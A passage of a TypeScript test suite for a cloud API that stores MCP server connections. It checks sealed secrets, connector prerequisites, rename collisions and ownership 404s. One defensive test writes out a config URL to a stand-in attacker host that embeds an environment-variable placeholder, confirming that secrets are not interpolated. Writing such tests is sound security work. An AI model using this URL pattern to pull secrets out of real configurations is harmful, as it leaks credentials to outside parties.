      secrets: { user_jwt: userJwt },
    });
    expect(legitimate.statusCode, legitimate.body).toBe(201);
    expect(legitimate.json()).toMatchObject({ authState: "configured", hasSecrets: true });
    expect(legitimate.json()).not.toHaveProperty("config");
    expect(legitimate.body).not.toContain(userJwt);
    const rows = await db.$client.unsafe(
      "SELECT config, secrets_sealed FROM mcp_servers WHERE user_id = $1",
      [uid],
    );
    expect(rows[0]?.config).toEqual({
      base_url: "https://project.supabase.co",
      publishable_key: "sb_publishable_test_only",
      allowed_tables: "documents",
      allowed_columns: "id",
    });
    expect(JSON.stringify(rows)).not.toContain(userJwt);
  });

  it("requires Jira host/email plus api_token before configured or agent activation", async () => {
    const incomplete = [
      { name: "token only", config: undefined },
      { name: "missing email", config: { host: "acme.atlassian.net" } },
      { name: "missing host", config: { email: "person@example.test" } },
    ];
    const outcomes: Array<{ createAuth: string; createStatus: number; activationStatus: number }> = [];
    for (const variant of incomplete) {
      const uid = testUid("jira-incomplete");
      await seedPro(uid);
      const created = await postConnection(uid, {
        providerId: "jira",
        name: `Jira ${variant.name}`,
        config: variant.config,
        secrets: { api_token: "jira-token-sealed-28a4" },
      });
      const activated = await app.inject({
        method: "PATCH",
        url: `/cloud/v1/mcp/connections/${created.json().connectionId}`,
        headers: authHeaders(uid),
        payload: { agentEnabled: true },
      });
      outcomes.push({
        createStatus: created.statusCode,
        createAuth: created.json().authState,
        activationStatus: activated.statusCode,
      });
    }
    expect(outcomes).toEqual(incomplete.map(() => ({
      createStatus: 201,
      createAuth: "missing",
      activationStatus: 409,
    })));

    const uid = testUid("jira-complete");
    await seedPro(uid);
    const created = await postConnection(uid, {
      providerId: "jira",
      name: "Jira complete prerequisites",
      config: { host: "acme.atlassian.net", email: "person@example.test" },
      secrets: { api_token: "jira-token-sealed-28a4" },
    });
    expect(created.statusCode, created.body).toBe(201);
    expect(created.json()).toMatchObject({ authState: "configured", agentEnabled: false });
    const activated = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${created.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true },
    });
    expect(activated.statusCode, activated.body).toBe(200);
    expect(activated.json()).toMatchObject({
      agentEnabled: true,
      authState: "configured",
      healthState: "never_checked",
    });
  });

  it("requires every S3 credential and connection field before configured or agent activation", async () => {
    const completeConfig = {
      access_key_id: "AKIA-TEST-NONSECRET",
      region: "us-east-1",
      bucket: "connector-test-bucket",
    };
    const incomplete = [
      {},
      { access_key_id: completeConfig.access_key_id, region: completeConfig.region },
      { access_key_id: completeConfig.access_key_id, bucket: completeConfig.bucket },
      { region: completeConfig.region, bucket: completeConfig.bucket },
    ];
    const outcomes: Array<{ createAuth: string; createStatus: number; activationStatus: number }> = [];
    for (const [index, config] of incomplete.entries()) {
      const uid = testUid("s3-incomplete");
      await seedPro(uid);
      const created = await postConnection(uid, {
        providerId: "s3",
        name: `S3 incomplete ${index}`,
        config,
        secrets: {
          secret_access_key: "s3-secret-sealed-42d9",
          session_token: "s3-session-token-test-only",
        },
      });
      const activated = await app.inject({
        method: "PATCH",
        url: `/cloud/v1/mcp/connections/${created.json().connectionId}`,
        headers: authHeaders(uid),
        payload: { agentEnabled: true },
      });
      outcomes.push({
        createStatus: created.statusCode,
        createAuth: created.json().authState,
        activationStatus: activated.statusCode,
      });
    }
    expect(outcomes).toEqual(incomplete.map(() => ({
      createStatus: 201,
      createAuth: "missing",
      activationStatus: 409,
    })));

    const uid = testUid("s3-complete");
    await seedPro(uid);
    const created = await postConnection(uid, {
      providerId: "s3",
      name: "S3 complete prerequisites",
      config: completeConfig,
      secrets: {
        secret_access_key: "s3-secret-sealed-42d9",
        session_token: "s3-session-token-test-only",
      },
    });
    expect(created.statusCode, created.body).toBe(201);
    expect(created.json()).toMatchObject({ authState: "configured", agentEnabled: false });
    const activated = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${created.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true },
    });
    expect(activated.statusCode, activated.body).toBe(200);
    expect(activated.json()).toMatchObject({
      agentEnabled: true,
      authState: "configured",
      healthState: "never_checked",
    });
    const stored = await db.$client.unsafe("SELECT config, secrets_sealed FROM mcp_servers WHERE id = $1", [created.json().connectionId]);
    expect(stored[0]?.config).toEqual(completeConfig);
    expect(JSON.stringify(stored)).not.toContain("s3-secret-sealed-42d9");

    const activeUid = testUid("s3-active-incomplete-replacement");
    await seedPro(activeUid);
    const active = await postConnection(activeUid, {
      providerId: "s3",
      name: "S3 active replacement fence",
      secrets: {
        ...completeConfig,
        secret_access_key: "s3-original-complete-secret-52a8",
        session_token: "s3-original-session-token-test-only",
      },
    });
    expect(active.statusCode, active.body).toBe(201);
    const activeId = active.json().connectionId;
    const enabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${activeId}`,
      headers: authHeaders(activeUid),
      payload: { agentEnabled: true },
    });
    expect(enabled.statusCode, enabled.body).toBe(200);
    expect(enabled.json()).toMatchObject({ agentEnabled: true, configVersion: 2 });
    const refused = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${activeId}`,
      headers: authHeaders(activeUid),
      payload: { secrets: { secret_access_key: "s3-incomplete-replacement-19b7" } },
    });
    expect(refused.statusCode, refused.body).toBe(409);
    expect(refused.json().error.code).toBe("auth_required");
    const current = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${activeId}`,
      headers: authHeaders(activeUid),
    });
    expect(current.json()).toMatchObject({
      agentEnabled: true,
      authState: "configured",
      configVersion: 2,
    });
    const incompleteDisableReplacement = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${activeId}`,
      headers: authHeaders(activeUid),
      payload: { enabled: false, secrets: { secret_access_key: "s3-disabled-incomplete-44c1" } },
    });
    expect(incompleteDisableReplacement.statusCode, incompleteDisableReplacement.body).toBe(409);
    const explicitDisable = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${activeId}`,
      headers: authHeaders(activeUid),
      payload: { enabled: false },
    });
    expect(explicitDisable.statusCode, explicitDisable.body).toBe(200);
    expect(explicitDisable.json()).toMatchObject({ enabled: false, healthState: "disabled" });
  });

  it("legacy PATCH preserves active prerequisites while allowing disable and the bare-array DTO", async () => {
    const uid = testUid("legacy-active-prerequisites");
    await seedPro(uid);
    const id = newId();
    const complete = {
      access_key_id: "AKIA-LEGACY-NONSECRET",
      region: "us-east-1",
      bucket: "legacy-test-bucket",
      secret_access_key: "legacy-original-sealed-secret-38f2",
      session_token: "legacy-original-session-token-test-only",
    };
    await db.$client.unsafe(
      `INSERT INTO mcp_servers
        (id, user_id, name, transport, curated_id, provider_id, auth_state,
         health_state, last_checked_at, last_success_at, config_version,
         agent_enabled, enabled, config, secrets_sealed)
       VALUES ($1, $2, 'Legacy active S3', 'native', 's3', 's3', 'configured',
         'healthy', '2026-10-24T12:00:00Z', '2026-10-24T12:00:00Z', 1,
         true, true, NULL, $3::jsonb)`,
      [id, uid, JSON.stringify(crypto.encrypt(JSON.stringify(complete), `mcp_servers:${id}`))],
    );

    const replacement = "legacy-incomplete-replacement-61a4";
    const incomplete = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${id}`,
      headers: authHeaders(uid),
      payload: { secrets: { secret_access_key: replacement } },
    });
    expect(incomplete.statusCode, incomplete.body).toBe(409);
    expect(incomplete.json().error.code).toBe("auth_required");
    const unchanged = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(unchanged.json()).toMatchObject({
      connectionId: id,
      agentEnabled: true,
      enabled: true,
      authState: "configured",
      configVersion: 1,
    });

    const incompleteDisableReplacement = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${id}`,
      headers: authHeaders(uid),
      payload: { enabled: false, secrets: { secret_access_key: replacement } },
    });
    expect(incompleteDisableReplacement.statusCode, incompleteDisableReplacement.body).toBe(409);
    const stillActive = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(stillActive.json()).toMatchObject({
      agentEnabled: true,
      enabled: true,
      authState: "configured",
      configVersion: 1,
    });

    await db.$client.unsafe(
      "UPDATE mcp_servers SET enabled = false, health_state = 'disabled' WHERE id = $1",
      [id],
    );
    const reenabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${id}`,
      headers: authHeaders(uid),
      payload: { enabled: true },
    });
    expect(reenabled.statusCode, reenabled.body).toBe(200);
    expect(mcpServerDtoSchema.parse(reenabled.json())).toMatchObject({
      id,
      enabled: true,
      hasSecrets: true,
    });
    const restored = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(restored.json()).toMatchObject({
      agentEnabled: true,
      enabled: true,
      authState: "configured",
    });

    const disabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${id}`,
      headers: authHeaders(uid),
      payload: { enabled: false },
    });
    expect(disabled.statusCode, disabled.body).toBe(200);
    expect(mcpServerDtoSchema.parse(disabled.json())).toMatchObject({
      id,
      enabled: false,
      curatedId: "s3",
    });
    expect(disabled.json()).not.toHaveProperty("agentEnabled");
    expect(disabled.json()).not.toHaveProperty("authState");
    expect(disabled.body).not.toContain(replacement);

    const legacyList = await app.inject({
      method: "GET",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
    });
    expect(legacyList.statusCode).toBe(200);
    expect(Array.isArray(legacyList.json())).toBe(true);
    expect(legacyList.json()).toHaveLength(1);
    expect(mcpServerDtoSchema.parse(legacyList.json()[0])).toMatchObject({
      id,
      curatedId: "s3",
      enabled: false,
    });
  });

  it("projects legacy unknown auth from curated identity and verified sealed prerequisites", async () => {
    const validSecret = "legacy-github-valid-sealed-73e1";
    const variants = [
      { name: "missing", sealed: null, plaintext: null, expected: "missing" },
      { name: "valid", sealed: "valid", plaintext: { GITHUB_TOKEN: validSecret }, expected: "configured" },
      { name: "incomplete", sealed: "valid", plaintext: { UNRELATED: "not-a-github-token" }, expected: "missing" },
      { name: "malformed-json", sealed: "valid", plaintext: "not-json", expected: "missing" },
      { name: "malformed-envelope", sealed: "malformed", plaintext: null, expected: "missing" },
    ] as const;
    const outcomes: Array<{ expected: string; actual: string; providerId: string; body: string }> = [];
    for (const variant of variants) {
      const uid = testUid(`legacy-auth-${variant.name}`);
      await seedPro(uid);
      const id = newId();
      const sealed = variant.sealed === "valid"
        ? crypto.encrypt(JSON.stringify(variant.plaintext), `mcp_servers:${id}`)
        : variant.sealed === "malformed"
          ? { wrappedDek: "not-an-envelope", iv: "bad", ciphertext: "bad", tag: "bad" }
          : null;
      await db.$client.unsafe(
        `INSERT INTO mcp_servers
          (id, user_id, name, transport, curated_id, provider_id, auth_state, secrets_sealed, agent_enabled)
         VALUES ($1, $2, $3, 'native', 'github', NULL, 'unknown', $4::jsonb, false)`,
        [id, uid, `Legacy GitHub ${variant.name}`, sealed === null ? null : JSON.stringify(sealed)],
      );
      const res = await app.inject({
        method: "GET",
        url: `/cloud/v1/mcp/connections/${id}`,
        headers: authHeaders(uid),
      });
      expect(res.statusCode).toBe(200);
      outcomes.push({
        expected: variant.expected,
        actual: res.json().authState,
        providerId: res.json().providerId,
        body: res.body,
      });
    }
    expect(outcomes.map((outcome) => outcome.actual)).toEqual(outcomes.map((outcome) => outcome.expected));
    expect(outcomes.every((outcome) => outcome.providerId === "github")).toBe(true);
    expect(outcomes.every((outcome) => !outcome.body.includes(validSecret))).toBe(true);
  });

  it("rejects reserved and colliding custom renames on the new connection route", async () => {
    const uid = testUid("connection-rename-admission");
    await seedPro(uid);
    const alpha = await postConnection(uid, {
      providerId: "custom-alpha",
      name: "Alpha",
      transport: "stdio",
      config: { command: "custom-alpha" },
    });
    const beta = await postConnection(uid, {
      providerId: "custom-beta",
      name: "Beta",
      transport: "stdio",
      config: { command: "custom-beta" },
    });
    const unicode = await postConnection(uid, {
      providerId: "custom-unicode",
      name: "éclair",
      transport: "stdio",
      config: { command: "custom-unicode" },
    });
    expect(unicode.statusCode).toBe(201);
    const betaId = beta.json().connectionId as string;
    await db.$client.unsafe(
      "UPDATE mcp_servers SET approved_source_id = 'source-a', approved_digest = 'digest-a' WHERE id = $1",
      [alpha.json().connectionId],
    );
    await db.$client.unsafe(
      "UPDATE mcp_servers SET approved_source_id = 'source-b', approved_digest = 'digest-b' WHERE id = $1",
      [betaId],
    );

    for (const name of ["Alpha!", "fetch", "verceℓ", "e\u0301clair!"]) {
      const refused = await patchConnection(uid, betaId, { name });
      expect(refused.statusCode, `${name}: ${refused.body}`).toBe(409);
      expect(refused.json().error.code).toBe("server_exists");
    }
    const unchanged = await patchConnection(uid, betaId, {});
    expect(unchanged.json()).toMatchObject({ name: "Beta", configVersion: 1, disconnectGeneration: 0 });

    const sameSourceTarget = await postConnection(uid, {
      providerId: "custom-same-source-target",
      name: "Same Source Occupied",
      transport: "stdio",
      config: { command: "custom-same-source-target" },
    });
    const sameSourceCandidate = await postConnection(uid, {
      providerId: "custom-same-source-candidate",
      name: "Same Source Candidate",
      transport: "stdio",
      config: { command: "custom-same-source-candidate" },
    });
    expect(sameSourceTarget.statusCode, sameSourceTarget.body).toBe(201);
    expect(sameSourceCandidate.statusCode, sameSourceCandidate.body).toBe(201);
    for (const id of [sameSourceTarget.json().connectionId, sameSourceCandidate.json().connectionId]) {
      await db.$client.unsafe(
        "UPDATE mcp_servers SET approved_source_id = 'source-shared', approved_digest = 'digest-shared' WHERE id = $1",
        [id],
      );
    }
    const sameSourceCollision = await patchConnection(uid, sameSourceCandidate.json().connectionId, {
      name: "same source occupied!",
    });
    expect(sameSourceCollision.statusCode, sameSourceCollision.body).toBe(409);
    expect(sameSourceCollision.json().error.code).toBe("server_exists");

    const renamed = await patchConnection(uid, betaId, { name: "eclair" });
    expect(renamed.statusCode, renamed.body).toBe(200);
    expect(renamed.json()).toMatchObject({ name: "eclair", configVersion: 2, disconnectGeneration: 0 });
    const sameSourceValid = await patchConnection(uid, alpha.json().connectionId, { name: "Alpha Renamed" });
    expect(sameSourceValid.statusCode, sameSourceValid.body).toBe(200);
    expect(sameSourceValid.json()).toMatchObject({
      name: "Alpha Renamed",
      configVersion: 2,
      disconnectGeneration: 0,
    });
    const selfRename = await patchConnection(uid, alpha.json().connectionId, { name: "ALPHA RENAMED!" });
    expect(selfRename.statusCode, selfRename.body).toBe(200);
    expect(selfRename.json()).toMatchObject({ name: "ALPHA RENAMED!", configVersion: 3 });
  });

  it("serializes concurrent custom renames on the new connection route", async () => {
    const uid = testUid("connection-concurrent-rename");
    await seedPro(uid);
    const first = await postConnection(uid, {
      providerId: "custom-first",
      name: "First",
      transport: "stdio",
      config: { command: "custom-first" },
    });
    const second = await postConnection(uid, {
      providerId: "custom-second",
      name: "Second",
      transport: "stdio",
      config: { command: "custom-second" },
    });
    const ids = [first.json().connectionId as string, second.json().connectionId as string];
    const responses = await Promise.all([
      patchConnection(uid, ids[0]!, { name: "Shared Rename" }),
      patchConnection(uid, ids[1]!, { name: "shared rename!" }),
    ]);
    expect(responses.filter((response) => response.statusCode === 200)).toHaveLength(1);
    expect(responses.filter((response) => response.statusCode === 409)).toHaveLength(1);
    const rows = await db.$client.unsafe(
      "SELECT id, name, config_version FROM mcp_servers WHERE user_id = $1",
      [uid],
    );
    expect(rows.filter((row) => row.name.toLowerCase().includes("shared rename"))).toHaveLength(1);
    expect(rows.filter((row) => row.config_version === 1)).toHaveLength(1);
    expect(rows.filter((row) => row.config_version === 2)).toHaveLength(1);
  });

  it("enforces the same rename admission on the legacy route without changing its DTO", async () => {
    const uid = testUid("legacy-rename-admission");
    await seedPro(uid);
    const alpha = await postServer(uid, {
      name: "Alpha",
      transport: "http",
      url: "https://legacy-alpha.example.test/mcp",
    });
    const beta = await postServer(uid, {
      name: "Beta",
      transport: "http",
      url: "https://legacy-beta.example.test/mcp",
    });
    const unicode = await postServer(uid, {
      name: "éclair",
      transport: "http",
      url: "https://legacy-unicode.example.test/mcp",
    });
    expect(unicode.statusCode).toBe(201);
    const betaId = beta.json().id as string;
    await db.$client.unsafe(
      "UPDATE mcp_servers SET approved_source_id = 'source-a', approved_digest = 'digest-a' WHERE id = $1",
      [alpha.json().id],
    );
    await db.$client.unsafe(
      "UPDATE mcp_servers SET approved_source_id = 'source-b', approved_digest = 'digest-b' WHERE id = $1",
      [betaId],
    );

    for (const name of ["Alpha!", "fetch", "verceℓ", "e\u0301clair!"]) {
      const refused = await patchServer(uid, betaId, { name });
      expect(refused.statusCode, `${name}: ${refused.body}`).toBe(409);
      expect(refused.json().error.code).toBe("server_exists");
    }
    const sameSourceTarget = await postServer(uid, {
      name: "Same Source Occupied",
      transport: "http",
      url: "https://legacy-same-source-target.example.test/mcp",
    });
    const sameSourceCandidate = await postServer(uid, {
      name: "Same Source Candidate",
      transport: "http",
      url: "https://legacy-same-source-candidate.example.test/mcp",
    });
    expect(sameSourceTarget.statusCode, sameSourceTarget.body).toBe(201);
    expect(sameSourceCandidate.statusCode, sameSourceCandidate.body).toBe(201);
    for (const id of [sameSourceTarget.json().id, sameSourceCandidate.json().id]) {
      await db.$client.unsafe(
        "UPDATE mcp_servers SET approved_source_id = 'source-shared', approved_digest = 'digest-shared' WHERE id = $1",
        [id],
      );
    }
    const sameSourceCollision = await patchServer(uid, sameSourceCandidate.json().id, {
      name: "same source occupied!",
    });
    expect(sameSourceCollision.statusCode, sameSourceCollision.body).toBe(409);
    expect(sameSourceCollision.json().error.code).toBe("server_exists");
    const renamed = await patchServer(uid, betaId, { name: "eclair" });
    expect(renamed.statusCode, renamed.body).toBe(200);
    expect(renamed.json()).toMatchObject({ id: betaId, name: "eclair", enabled: true });
    expect(renamed.json()).not.toHaveProperty("agentEnabled");
    expect(renamed.json()).not.toHaveProperty("authState");

    const sameSourceValid = await patchServer(uid, alpha.json().id, { name: "Alpha Renamed" });
    expect(sameSourceValid.statusCode, sameSourceValid.body).toBe(200);
    expect(sameSourceValid.json()).toMatchObject({ name: "Alpha Renamed" });
    const selfRename = await patchServer(uid, alpha.json().id, { name: "ALPHA RENAMED!" });
    expect(selfRename.statusCode, selfRename.body).toBe(200);
    expect(selfRename.json()).toMatchObject({ name: "ALPHA RENAMED!" });
  });

  it("PATCH fences renames/secrets and DELETE disconnects with generation invalidation", async () => {
    const uid = testUid("connection-generations");
    await seedPro(uid);
    const created = await postConnection(uid, {
      providerId: "github",
      name: "Before rename",
      secrets: { GITHUB_TOKEN: CONNECTION_SECRET },
    });
    const id = created.json().connectionId;
    generationInvalidations.length = 0;

    const renamed = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
      payload: { name: "After rename" },
    });
    expect(renamed.statusCode, renamed.body).toBe(200);
    expect(renamed.json()).toMatchObject({
      connectionId: id,
      providerId: "github",
      name: "After rename",
      configVersion: 2,
      disconnectGeneration: 0,
    });

    const replacement = "replacement-secret-never-project-77c2";
    const patched = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
      payload: { secrets: { GITHUB_TOKEN: replacement } },
    });
    expect(patched.statusCode, patched.body).toBe(200);
    expect(patched.json().configVersion).toBe(3);
    expect(patched.body).not.toContain(replacement);
    expect(patched.json()).not.toHaveProperty("config");
    expect(patched.json()).not.toHaveProperty("secrets");
    const stored = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [id],
    )) as { sealed: EncryptedEnvelope }[];
    const plain = JSON.parse(crypto.decrypt(stored[0]!.sealed, `mcp_servers:${id}`));
    expect(plain).toEqual({ GITHUB_TOKEN: replacement });
    expect(JSON.stringify(plain)).not.toContain(CONNECTION_SECRET);
    expect(generationInvalidations.map((change) => change.configVersion)).toEqual([2, 3]);

    const removed = await app.inject({
      method: "DELETE",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(removed.statusCode).toBe(204);
    const disconnected = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(disconnected.statusCode).toBe(200);
    expect(disconnected.json()).toMatchObject({
      connectionId: id,
      enabled: false,
      agentEnabled: false,
      authState: "revoked",
      healthState: "revoked",
      configVersion: 3,
      disconnectGeneration: 1,
    });
    expect(generationInvalidations.at(-1)).toEqual({
      connectionId: id,
      userId: uid,
      configVersion: 3,
      disconnectGeneration: 1,
    });
  });

  it("new connection routes return the same 404 for wrong owners and malformed IDs", async () => {
    const uid = testUid("connection-owner");
    const other = testUid("connection-other");
    await seedPro(uid);
    await seedPro(other);
    const created = await postConnection(uid, { providerId: "github", name: "Owned connection" });
    const id = created.json().connectionId;
    for (const method of ["GET", "PATCH", "DELETE"]) {
      const res = await app.inject({
        method,
        url: `/cloud/v1/mcp/connections/${id}`,
        headers: authHeaders(other),
        ...(method === "PATCH" ? { payload: { unexpected: true } } : {}),
      });
      expect(res.statusCode).toBe(404);
      expect(res.json()).toEqual({ error: { code: "not_found", message: "MCP server not found." } });
    }
    for (const method of ["GET", "PATCH", "DELETE"]) {
      const res = await app.inject({
        method,
        url: "/cloud/v1/mcp/connections/not-a-uuid",
        headers: authHeaders(uid),
        ...(method === "PATCH" ? { payload: { enabled: false } } : {}),
      });
      expect(res.statusCode).toBe(404);
    }
    const stillCurrent = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
    });
    expect(stillCurrent.json()).toMatchObject({ enabled: true, disconnectGeneration: 0 });
  });

  it("GET /mcp/servers/:id unknown or malformed id → the same 404 envelope", async () => {
    const uid = testUid("mcp-404");
    for (const id of ["not-a-uuid", "00000000-0000-4000-8000-000000000000"]) {
      const res = await app.inject({
        method: "GET",
        url: `/cloud/v1/mcp/servers/${id}`,
        headers: authHeaders(uid),
      });
      expect(res.statusCode).toBe(404);
      expect(res.json()).toEqual({ error: { code: "not_found", message: "MCP server not found." } });
    }
  });
});

/** Shape-only sanity: the DTO never carries a secrets/env/headers field. */
describe("parseMcpConfig env default (C1 defense in depth)", () => {
  it("defaults to an EMPTY env, never the process environment", () => {
    process.env.CONFIG_PARSE_DEFAULT_PROBE = "process-secret-should-not-resolve";
    try {
      const raw = JSON.stringify({
        mcpServers: {
          s: { url: "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}" },
        },
      });
      const out = parseMcpConfig(raw);
      expect(out).toHaveLength(1);
      expect(out[0]?.url).toBe(
        "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}",
      );
      expect(JSON.stringify(out)).not.toContain(
        "process-secret-should-not-resolve",
      );
    } finally {
      delete process.env.CONFIG_PARSE_DEFAULT_PROBE;
    }
  });
});

describe("McpServerDto surface", () => {
  it("mcpServerDtoSchema rejects a DTO carrying a secrets blob", () => {
    const leaked = {
      id: "x",
      name: "x",
      transport: "http",
      curatedId: null,
      enabled: true,
      hasSecrets: true,
      needsAuth: false,
      createdAt: "2026-01-01T00:00:00Z",
      updatedAt: "2026-01-01T00:00:00Z",
      secrets: { env: { A: "b" } },
    };
    // z.object is strip-by-default; the leak check is the ROUTE's job — but
    // the parsed DTO must never surface it.
    const parsed = mcpServerDtoSchema.parse(leaked) as McpServerDto & { secrets?: unknown };
    expect(parsed.secrets).toBeUndefined();
  });
});
